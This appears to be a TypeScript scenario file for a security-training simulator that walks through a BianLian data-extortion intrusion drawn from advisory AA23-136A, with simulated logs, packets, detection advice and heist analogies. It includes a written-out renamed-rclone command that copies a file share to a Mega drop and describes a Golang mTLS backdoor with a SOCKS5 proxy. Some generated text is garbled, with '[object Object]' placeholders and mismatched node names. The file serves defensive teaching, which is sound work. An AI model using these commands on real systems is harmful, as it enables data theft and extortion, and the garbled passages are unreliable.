import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'bianlian-extortion-go-backdoor-rdp',
    title: 'BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1048',
    description:
      'BianLian operators abandon file encryption in favor of pure data-exfiltration extortion (AA23-136A). They deploy a custom cross-compiled Golang mTLS backdoor containing an embedded go-socks5 server, enumerate AD shares via SharpShares, and exfiltrate terabytes of data over rclone and FileZilla without triggering ransomware file-write sensors.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'BianLian Extortion C2 & Mega/FTP Drop', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Golang mTLS Backdoor (Windows/Linux)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Embedded go-socks5 Memory Proxy', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-136A / Red Canary Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Pure Exfiltration (rclone / SharpShares)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning',
        narration:
          'BianLian compiles a unique per-victim 64-bit Golang binary (disguised as SystemSettingsAdminFlows.exe or Win64Ark.exe) that connects outbound over mutual TLS (mTLS) with hardcoded client/server X.509 certificates to an attacker C2 IP.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Command and Control (T1573.002 - Asymmetric Cryptography / mTLS)',
        technicalCommands: [
          'C:\\Windows\\Temp\\SystemSettingsAdminFlows.exe (Golang binary with main.run & main.backconnect)',
          'mTLS Handshake: Presents embedded client X.509 cert to C2 IP:443',
        ],
        defenseMitigation:
          'Hunt for unsigned Golang binaries (`Go build ID`) executing from `C:\\Windows\\Temp` or `C:\\ProgramData` that initiate long-lived TLS sessions to uncategorized IP literals without a preceding DNS lookup.',
        logs: [
          {
            id: 'bian-1',
            timestamp: '05:14:02.118',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 3,
            ProcessName: 'SystemSettingsAdminFlows.exe',
            raw: 'EventID: 3 (NetworkConnect) | Image: C:\\Windows\\Temp\\SystemSettingsAdminFlows.exe (Unsigned Golang Binary) | DestinationIp: 198.51.100.142 | DestinationPort: 443 | GoSymbols: main.backconnect, github.com/armon/go-socks5 | Advisory: CISA AA23-136A',
            parsedFields: {
              MalwareFamily: 'BianLian Custom Golang Backdoor',
              EmbeddedGoPackages: 'main.backconnect, github.com/armon/go-socks5, github.com/hashicorp/yamux',
              C2Protocol: 'Mutual TLS (mTLS) to Raw IP Literal',
            },
          },
        ],
        packets: [
          {
            id: 'bian-pkt-1',
            timestamp: '05:14:02.110',
            protocol: 'TCP',
            sourceIp: '10.20.10.55',
            destIp: '198.51.100.142',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '16 03 03 01 F0 01 00 01 EC 03 03 62 69 61 6E 6C 69 61 6E 5F 6D 74 6C 73 5F 79 61 6D 75 78',
            decodedString: 'mTLS ClientHello + Certificate (Self-Signed X.509 Pinning over HashiCorp Yamux Multiplexer)',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot',
        narration:
          'Inside the mTLS connection, the Golang implant uses HashiCorp’s yamux stream multiplexer and armon/go-socks5 to expose an in-memory SOCKS5 proxy to the operator, allowing the attacker to run Impacket, RDP, and SharpShares from their external C2 directly into internal subnets.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Command and Control (T1090.001 - Internal Proxy / SOCKS5)',
        technicalCommands: [
          'Go Routine: yamux.Server(tlsConn, nil) -> socks5.New(&socks5.Config{})',
          'SharpShares.exe /threads:50 /filter:SYSVOL,NETLOGON,IPC$',
        ],
        defenseMitigation:
          'Monitor internal East-West SMB (445), LDAP (389), and RDP (3389) connections originating from a single workstation or server that is simultaneously holding a high-throughput outbound TLS socket.',
        logs: [
          {
            id: 'bian-2',
            timestamp: '05:19:33.504',
            source: 'EDR',
            severity: 'critical',
            raw: 'Lateral Movement via Embedded SOCKS5 Proxy | ProxyHost: 10.20.10.55 (SystemSettingsAdminFlows.exe) | Multiplexer: hashicorp/yamux | DownstreamConnections: 142 internal SMB (445) & LDAP (389) connections via SharpShares',
            parsedFields: {
              MultiplexerLibrary: 'github.com/hashicorp/yamux + armon/go-socks5',
              DiscoveryTool: 'SharpShares.exe',
              LateralFootprint: 'Zero secondary implants needed on target SMB file servers',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)',
        narration:
          'Rather than deploying a file encryptor (which triggers behavioral ransomware rollbacks and gives victims no incentive to prevent publication once backups are restored), BianLian renames rclone.exe to Win.exe, exfiltrates sensitive legal, financial, and healthcare databases to Mega.io / FTP servers, and drops a pure-extortion note.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1567.002 - Exfiltration to Cloud Storage / T1048)',
        technicalCommands: [
          'C:\\ProgramData\\Win.exe (renamed rclone.exe) copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault --bwlimit 50M',
          'Drop extortion note: Look_at_this_file.txt (No file encryption performed)',
        ],
        defenseMitigation:
          'Block outbound access to consumer cloud storage APIs (`*.mega.co.nz`, `api.mega.co.nz`, `pcloud.com`) and match `rclone.exe` by PE metadata (`OriginalFileName: rclone.exe` / Go symbol table) regardless of binary rename.',
        logs: [
          {
            id: 'bian-3',
            timestamp: '06:02:11.908',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'Win.exe',
            CommandLine: 'C:\\ProgramData\\Win.exe copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault --bwlimit 50M',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\Win.exe | OriginalFileName: rclone.exe | CommandLine: Win.exe copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault | ExtortionModel: Pure Exfiltration (Zero Files Encrypted)',
            parsedFields: {
              RenamedBinary: 'C:\\ProgramData\\Win.exe (OriginalFileName: rclone.exe)',
              ExfiltrationDestination: 'Mega.io Cloud Storage & External FTP',
              ExtortionModel: 'Pure Data-Leak Extortion (No File Encryption)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'bianlian-extortion-go-backdoor-rdp',
    briefing: {
      headline:
        'BianLian operators abandon file encryption in favor of pure data-exfiltration extortion (AA23-136A), deploying a custom Golang mTLS backdoor with an embedded yamux/go-socks5 proxy and exfiltrating terabytes of data via renamed rclone binaries.',
      storyAnalogy:
        'Imagine a modern heist crew that realizes blowing up the bank vault (ransomware encryption) sets off every alarm in the city and forces the bank to rebuild from backups anyway. Instead, they slip in quietly, install a single custom-built periscope (Golang mTLS + SOCKS5 Backdoor) that lets them peer into every room from across the ocean, photocopy every confidential legal and financial contract (rclone), and leave a quiet note on the CEO’s desk without touching a single lock.',
      plainSummary:
        'In this scenario (T1573.002, BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: deploying Custom Golang mTLS Backdoor, then in-Memory Yamux Multiplexing, then pure Data-Exfiltration Extortion via Rclone. Steps #1–#3 walk that chain end-to-end by covering Deploying Custom Golang mTLS Backdoor, then In-Memory Yamux Multiplexing, then Pure Data-Exfiltration Extortion via Rclone, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'BianLian Extortion C2 & Mega/FTP Drop -> Golang mTLS Backdoor (Windows/Linux) -> Embedded go-socks5 Memory Proxy -> Pure Exfiltration (rclone / SharpShares) -> CISA AA23-136A / Red Canary Sensor.',
      documentedAdvisory:
        'CISA / FBI / ASD Joint Advisory AA23-136A (#StopRansomware: BianLian) / Red Canary & Avast BianLian Golang Analysis',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1573.002',
        plainTitle: 'Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning',
        storyAnalogy:
          'For each target company, the attacker compiles a fresh, one-of-a-kind Go program that only talks to a single hardcoded IP address using a pair of matching digital passports (mTLS).',
        simpleExplanation:
          'After initial entry, BianLian dropped a uniquely compiled 64-bit Golang executable (masquerading under Windows system filenames like SystemSettingsAdminFlows.exe or Win64Ark.exe) that initiated an outbound mutual TLS (mTLS) connection directly to a hardcoded C2 IP address (embedding both the client X.509 certificate/private key and the expected C2 server certificate inside the Go binary so network middleboxes and security scanners could not intercept or probe the C2 server).',
        howItWorksInPractice:
          'Because the C2 IP and X.509 certificates are compiled directly into each binary right before deployment, every victim receives a distinct file hash. In the documented EventID 3 exchange from BianLian Extortion C2 & Mega/FTP Drop to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK 3 (confirming that the SystemSettingsAdminFlows.exe request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the BianLian Extortion C2 to the Golang mTLS Backdoor (Windows/Linux) over TCP port 443.',
        detectionAndEvidence:
          'Sysmon EventID 1 & 3 identifying unsigned Golang binaries in C:\\Windows\\Temp or C:\\ProgramData containing Go symbols main.backconnect, hashicorp/yamux, and armon/go-socks5.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1090.001',
        plainTitle: 'In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot',
        storyAnalogy:
          'Rather than installing malware on twenty different servers, the single Go program turns itself into an invisible switchboard (go-socks5), letting the attacker browse the whole network from the outside.',
        simpleExplanation:
          'Once the mTLS socket connected, the Golang backdoor wrapped the TLS stream in a HashiCorp Yamux connection multiplexer (github.com/hashicorp/yamux) and attached an in-memory SOCKS5 server (github.com/armon/go-socks5, allowing the external operator to route Impacket, SharpShares, LDAP queries, and SMB file reads through the single compromised host without dropping secondary implants onto target file servers).',
        howItWorksInPractice:
          'By centralizing C2 and proxying inside a single lightweight Go binary that contains zero exploit code or encryption routines, BianLian minimizes its endpoint footprint across the domain. In the documented EDR exchange from Perimeter Firewall & NDR Tap to Golang mTLS Backdoor (Windows/Linux), Golang mTLS Backdoor (Windows/Linux) responds with ALERT T1090.001 (confirming that the Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot request succeeded on Golang mTLS Backdoor (Windows/Linux) and establishing the runtime state required for Step #3 Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Golang mTLS Backdoor to the Embedded go-socks5 Memory Proxy and triggers the CISA AA23-136A / Red Canary Sensor.',
        detectionAndEvidence:
          'Network and EDR telemetry showing a single non-DC host initiating rapid fan-out SMB (445) and LDAP (389) connections while maintaining a persistent external TLS stream.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1567.002',
        plainTitle: 'Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)',
        storyAnalogy:
          'Instead of locking the files, which would trip ransomware alarms, the thief disguises a cloud-sync tool as Win.exe, copies the crown jewels to Mega.io, and leaves a ransom note.',
        simpleExplanation:
          'Skipping file encryption completely (thereby evading all EDR behavioral ransomware sensors that watch for mass file-rename or high-entropy overwrite loops), BianLian staged a renamed copy of rclone.exe (e.g., C:\\ProgramData\\Win.exe) or FileZilla to stream sensitive intellectual property, financial records, and PII to Mega.io cloud storage or attacker FTP servers, leaving behind Look_at_this_file.txt demanding payment to prevent public disclosure.',
        howItWorksInPractice:
          'Even when rclone.exe is renamed to Win.exe or svchost.exe, its PE version-info header (OriginalFileName: rclone.exe) and Go symbol table remain intact and detectable by YARA/Sysmon. Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the go-socks5 proxy and SharpShares discovery into Pure Exfiltration (rclone / SharpShares) out to the BianLian Mega/FTP Drop.',
        detectionAndEvidence:
          'Sysmon EventID 1 matching OriginalFileName=rclone.exe or command-line flags (copy, --bwlimit, mega:) and egress firewall blocks on *.mega.co.nz. Preserve the raw event fields and the related containment ticket for forensic replay.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a slick extortion crew that decides padlocking a building is too loud and attracts every fire alarm on the block. Instead, they craft a custom one-of-a-kind secret radio tailored for that single victim, split that single radio line into dozens of parallel whispering corridors to map every shared file room, and quietly truck out every confidential blueprint in disguised moving vans so they can threaten public exposure without ever breaking a single lock.',
      storyMappings: [
        {
          storyTerm: 'Custom one-of-a-kind secret radio tailored for one victim',
          technicalTerm: 'Per-victim compiled Golang mTLS backdoor with hardcoded X.509 certificate pinning',
          tone: 'amber',
        },
        {
          storyTerm: 'Splitting one radio line into dozens of parallel whispering corridors',
          technicalTerm: 'In-memory hashicorp/yamux multiplexing paired with armon/go-socks5 lateral proxy',
          tone: 'sky',
        },
        {
          storyTerm: 'Mapping every shared file room silently',
          technicalTerm: 'SharpShares enumerating accessible SMB shares across internal servers',
          tone: 'rose',
        },
        {
          storyTerm: 'Trucking out blueprints without breaking a single lock',
          technicalTerm: 'Pure data-exfiltration extortion via renamed rclone.exe (Win.exe) and FTP with zero encryption',
          tone: 'emerald',
        },
      ],
      plainSummary:
        'In this scenario (T1573.002, BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: deploying Custom Golang mTLS Backdoor, then in-Memory Yamux Multiplexing, then pure Data-Exfiltration Extortion via Rclone. Steps #1–#3 walk that chain end-to-end by covering Deploying Custom Golang mTLS Backdoor, then In-Memory Yamux Multiplexing, then Pure Data-Exfiltration Extortion via Rclone, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
    },
    steps: {
      1: {
        storyAnalogy:
          'Right after crossing the perimeter, the crew drops a bespoke compact radio built specifically for this single victim that refuses to speak to anyone except one hardcoded wax-sealed command tower, preventing security analysts from impersonating or hijacking the line.',
        storyMappings: [
          {
            storyTerm: 'Bespoke compact radio compiled per victim',
            technicalTerm: 'Uniquely compiled 64-bit Golang backdoor masquerading in C:\\Windows\\Temp or ProgramData',
            tone: 'amber',
          },
          {
            storyTerm: 'Refusing to speak except to one hardcoded wax-sealed tower',
            technicalTerm: 'Mutual TLS (mTLS) authentication with hardcoded X.509 client and server pinning',
            tone: 'sky',
          },
          {
            storyTerm: 'Distinct internal radio parts stamped inside',
            technicalTerm: 'Embedded Go package symbols main.backconnect, hashicorp/yamux, and armon/go-socks5',
            tone: 'rose',
          },
          {
            storyTerm: 'Sensor catching the unsigned newcomer',
            technicalTerm: 'Sysmon EventID 1 and EventID 3 flagging unsigned Go binaries making external TLS calls',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Correlate Sysmon EventID 1 (Process Creation) and EventID 3 (Network Connection) to identify unsigned Golang executables in C:\\Windows\\Temp or C:\\ProgramData containing Go symbols main.backconnect, hashicorp/yamux, and armon/go-socks5 (unmistakable BianLian backdoor indicators).',
      },
      2: {
        storyAnalogy:
          'Over that single quiet encrypted radio line, the backdoor splits open dozens of virtual internal hallway lanes at once, allowing remote operators to probe internal file rooms and directory cabinets as if sitting directly inside the corporate office.',
        storyMappings: [
          {
            storyTerm: 'Splitting one radio line into dozens of hallway lanes',
            technicalTerm: 'HashiCorp Yamux stream multiplexing layered inside the mTLS connection',
            tone: 'amber',
          },
          {
            storyTerm: 'Internal doorway relay into corporate rooms',
            technicalTerm: 'Embedded armon/go-socks5 proxy forwarding operator traffic into the internal LAN',
            tone: 'sky',
          },
          {
            storyTerm: 'Probing internal file rooms and directory cabinets',
            technicalTerm: 'Rapid internal SMB (TCP/445) and LDAP (TCP/389) fan-out from one compromised host',
            tone: 'rose',
          },
          {
            storyTerm: 'Zero extra proxy tools dropped on disk',
            technicalTerm: 'All-in-one memory-resident proxy evading standalone Chisel/ngrok detections',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Monitor NDR and EDR network telemetry (which correlates internal east-west bursts with external sessions) for a single non-Domain-Controller host initiating rapid fan-out SMB (port 445) and LDAP (port 389) connections while holding a long-lived external TLS tunnel.',
      },
      3: {
        storyAnalogy:
          'Leaving every filing cabinet unlocked so anti-lockdown alarms stay completely silent, the crew renames a standard cloud-sync moving van to blend into Windows utilities, hauls out gigabytes of corporate records, and leaves behind an extortion threat demanding payment to prevent public leaks.',
        storyMappings: [
          {
            storyTerm: 'Leaving every cabinet unlocked to keep lockdown alarms silent',
            technicalTerm: 'Zero file encryption bypassing behavioral ransomware rollback and entropy detectors',
            tone: 'amber',
          },
          {
            storyTerm: 'Renamed cloud-sync moving van',
            technicalTerm: 'rclone.exe renamed to Win.exe syncing staged shares to Mega.io or FTP servers',
            tone: 'sky',
          },
          {
            storyTerm: 'Inventorying valuable corporate rooms first',
            technicalTerm: 'SharpShares mapping readable finance, legal, and HR SMB network shares',
            tone: 'rose',
          },
          {
            storyTerm: 'Extortion threat without encryption',
            technicalTerm: 'Pure data-theft ransom demand backed by threat of public leak-site publication',
            tone: 'emerald',
          },
        ],
      },
    },
  };
